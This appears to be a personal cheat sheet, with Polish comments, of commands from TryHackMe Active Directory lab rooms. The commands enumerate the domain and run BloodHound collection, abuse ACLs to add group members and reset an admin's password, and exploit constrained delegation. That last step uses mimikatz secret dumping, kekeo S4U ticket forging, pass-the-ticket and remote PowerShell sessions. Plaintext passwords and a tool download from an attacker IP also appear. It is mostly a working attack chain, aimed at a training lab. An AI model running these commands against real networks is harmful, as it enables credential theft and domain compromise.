# runas ... mmc.exe lub ssh/rdp cmd.exe > net user/group/accounts /domain
#powershell (wymada doinstalowania AD-RSAT)
Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *
Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A
Get-ADGroup -Identity Administrators -Server za.tryhackme.com
Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com
$ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
Get-ADDomain -Server za.tryhackme.com
Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)

# Bloodhunt
.\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
# kropka też
scp kenneth.davies@THMJMP1.za.tryhackme.com:C:/Users/kenneth.davies/Documents/20240713182815_BloodHound.zip .
sudo neo4j console | bloodhound --no-sandbox
# neo4j:32123
# /usr/lib/bloodhound/resources/app/Collectors/
Invoke-WebRequest -Uri 'http://10.50.56.216:80/SharpHound.exe'

#add-member
Add-ADGroupMember "IT Support" -Members "paula.bailey"
Get-ADGroupMember -Identity "IT Support"
# ForceChangePassword
Get-ADGroupMember -Identity "Tier 2 Admins"
$Password = ConvertTo-SecureString "Y2VgRWWiQ" -AsPlainText -Force
Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password
gpupdate /force

#Constrained Delegation Exploitation - powersploit
Import-Module C:\Tools\PowerView.ps1 
Get-NetUser -TrustedToAuth
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
token::elevate
lsadump::secrets
C:\Tools\kekeo\x64\kekeo.exe
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
privilege::debug
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
#powershell
New-PSSession -ComputerName thmserver1.za.tryhackme.loc
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
whoami

